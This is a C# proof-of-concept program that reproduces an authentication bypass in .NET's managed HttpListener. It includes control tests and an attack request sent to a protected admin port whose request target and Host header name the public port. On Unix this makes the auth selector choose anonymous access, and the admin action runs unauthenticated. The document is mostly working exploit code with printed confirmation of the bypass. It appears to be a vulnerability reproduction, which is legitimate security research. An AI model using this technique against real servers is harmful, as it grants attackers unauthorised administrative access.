using System.Net;
using System.Net.Sockets;
using System.Text;

static int ReservePort()
{
    using var t=new TcpListener(IPAddress.Loopback,0); t.Start();
    return ((IPEndPoint)t.LocalEndpoint).Port;
}
static Socket Connect(int p){var s=new Socket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.Tcp);s.Connect(IPAddress.Loopback,p);return s;}
static async Task<string> ReadWire(Socket s)
{
    byte[] b=new byte[8192];using var ms=new MemoryStream();using var cts=new CancellationTokenSource(TimeSpan.FromSeconds(5));
    try{while(true){int n=await s.ReceiveAsync(b.AsMemory(),SocketFlags.None,cts.Token);if(n==0)break;await ms.WriteAsync(b.AsMemory(0,n),cts.Token);}}catch(OperationCanceledException){}
    return Encoding.ASCII.GetString(ms.ToArray());
}

int adminPort=ReservePort(), publicPort=ReservePort();
while(publicPort==adminPort) publicPort=ReservePort();
Console.WriteLine($"OS={Environment.OSVersion}");
Console.WriteLine($"FRAMEWORK={System.Runtime.InteropServices.RuntimeInformation.FrameworkDescription}");
Console.WriteLine($"ADMIN_PORT={adminPort} PUBLIC_PORT={publicPort}");

AuthenticationSchemes Select(HttpListenerRequest r) =>
    string.Equals(r.UserHostName,$"localhost:{publicPort}",StringComparison.OrdinalIgnoreCase)
        ? AuthenticationSchemes.Anonymous : AuthenticationSchemes.Basic;

async Task<(HttpListener pub,HttpListener adm)> StartPair()
{
    var pub=new HttpListener();var adm=new HttpListener();
    pub.Prefixes.Add($"http://localhost:{publicPort}/");
    adm.Prefixes.Add($"http://localhost:{adminPort}/");
    pub.AuthenticationSchemes=AuthenticationSchemes.None;adm.AuthenticationSchemes=AuthenticationSchemes.None;
    pub.Realm="public-port";adm.Realm="admin-port";
    pub.AuthenticationSchemeSelectorDelegate=Select;adm.AuthenticationSchemeSelectorDelegate=Select;
    pub.Start();adm.Start();await Task.Yield();return(pub,adm);
}

// Public control on the public socket/port.
{
    var x=await StartPair();using var pub=x.pub;using var adm=x.adm;
    var pt=pub.GetContextAsync();var at=adm.GetContextAsync();using var c=Connect(publicPort);
    string raw=$"GET /public HTTP/1.1\r\nHost: localhost:{publicPort}\r\nConnection: close\r\n\r\n";
    await c.SendAsync(Encoding.ASCII.GetBytes(raw),SocketFlags.None);
    var ctx=await pt.WaitAsync(TimeSpan.FromSeconds(5));
    if(ctx.User is not null||at.IsCompletedSuccessfully)throw new Exception("public control");
    ctx.Response.StatusCode=200;ctx.Response.Close();await ReadWire(c);
    Console.WriteLine($"PORT_ONLY_PUBLIC_CONTROL=PASS USERHOST={ctx.Request.UserHostName} URLAUTHORITY={ctx.Request.Url?.Authority}");
}

// Admin control on protected port.
{
    var x=await StartPair();using var pub=x.pub;using var adm=x.adm;
    var pt=pub.GetContextAsync();var at=adm.GetContextAsync();using var c=Connect(adminPort);
    string raw=$"POST /admin-action HTTP/1.1\r\nHost: localhost:{adminPort}\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
    await c.SendAsync(Encoding.ASCII.GetBytes(raw),SocketFlags.None);
    var wt=ReadWire(c);var first=await Task.WhenAny(wt,pt,at).WaitAsync(TimeSpan.FromSeconds(5));
    if(!ReferenceEquals(first,wt))throw new Exception("admin control context delivered");
    string wire=await wt;
    if(!wire.Contains("401")||!wire.Contains("WWW-Authenticate: Basic",StringComparison.OrdinalIgnoreCase))throw new Exception("admin control no Basic 401");
    Console.WriteLine($"PORT_ONLY_ADMIN_CONTROL=PASS STATUS_401=True PUBLIC_CONTEXT={pt.IsCompletedSuccessfully} ADMIN_CONTEXT={at.IsCompletedSuccessfully}");
}

// Attack has NO Host-vs-request-target mismatch: both say the public port.
// TCP destination is the protected admin port. Managed HttpListener rewrites Request.Url.Port
// to the local admin port for prefix routing while the selector still sees publicPort in UserHostName.
{
    var x=await StartPair();using var pub=x.pub;using var adm=x.adm;
    int pc=0,ac=0;AuthenticationSchemes chosen=AuthenticationSchemes.None;
    string uh="<none>",ua="<none>",ru="<none>";
    pub.AuthenticationSchemeSelectorDelegate=r=>{Interlocked.Increment(ref pc);return Select(r);};
    adm.AuthenticationSchemeSelectorDelegate=r=>{
        Interlocked.Increment(ref ac);uh=r.UserHostName;ua=r.Url?.Authority??"<null>";ru=r.RawUrl??"<null>";
        chosen=Select(r);
        Console.WriteLine($"PORT_ONLY_ADMIN_SELECTOR USERHOST={uh} URLAUTHORITY={ua} RAWURL={ru} SELECTED={chosen}");
        return chosen;
    };
    var pt=pub.GetContextAsync();var at=adm.GetContextAsync();using var c=Connect(adminPort);
    string raw=
        $"POST http://localhost:{publicPort}/admin-action HTTP/1.1\r\n"+
        $"Host: localhost:{publicPort}\r\n"+
        "Content-Length: 0\r\nConnection: close\r\n\r\n";
    await c.SendAsync(Encoding.ASCII.GetBytes(raw),SocketFlags.None);

    var wt=ReadWire(c);var first=await Task.WhenAny(wt,pt,at).WaitAsync(TimeSpan.FromSeconds(5));

    if(OperatingSystem.IsWindows())
    {
        string wire=await wt;
        string firstLine=wire.Split(new[]{"\r\n","\n"},StringSplitOptions.None)[0];
        Console.WriteLine($"PORT_ONLY_WINDOWS_ATTACK RESULT={firstLine} PUB_CALLS={pc} ADMIN_CALLS={ac} USERHOST={uh} URLAUTHORITY={ua} RAWURL={ru} PUBLIC_CONTEXT={pt.IsCompletedSuccessfully} ADMIN_CONTEXT={at.IsCompletedSuccessfully}");
    }
    else
    {
        if(!ReferenceEquals(first,at))throw new Exception("managed Unix did not route to protected admin listener");
        var ctx=await at;
        if(pc!=0||ac!=1||chosen!=AuthenticationSchemes.Anonymous||ctx.User is not null)throw new Exception("port-only bypass invariant failed");
        if(ctx.Request.Url?.Port!=adminPort)throw new Exception("Url port was not rewritten to local admin port");
        if(!string.Equals(ctx.Request.UserHostName,$"localhost:{publicPort}",StringComparison.OrdinalIgnoreCase))throw new Exception("selector did not retain public authority");
        byte[] body=Encoding.ASCII.GetBytes("PORT_ONLY_ADMIN_ACTION_EXECUTED=true\n");
        ctx.Response.StatusCode=200;ctx.Response.ContentLength64=body.Length;await ctx.Response.OutputStream.WriteAsync(body);ctx.Response.Close();
        string wire=await wt;
        if(!wire.Contains("200")||wire.Contains("WWW-Authenticate: Basic",StringComparison.OrdinalIgnoreCase))throw new Exception("port-only attack wire");
        Console.WriteLine(
            $"PORT_ONLY_AUTH_BYPASS=CONFIRMED WIRE_HOST_EQUALS_TARGET_AUTHORITY=True TCP_DESTINATION_PORT={adminPort} " +
            $"RAW_TARGET_PORT={publicPort} USERHOST={ctx.Request.UserHostName} URLAUTHORITY={ctx.Request.Url?.Authority} " +
            $"ROUTED_LISTENER=ADMIN SELECTED={chosen} USER=ANONYMOUS STATUS_200=True PUBLIC_SELECTOR_CALLS={pc} ADMIN_SELECTOR_CALLS={ac}");
    }
}
Console.WriteLine("PORT_ONLY_AUTHORITY_BYPASS_MATRIX=PASS");
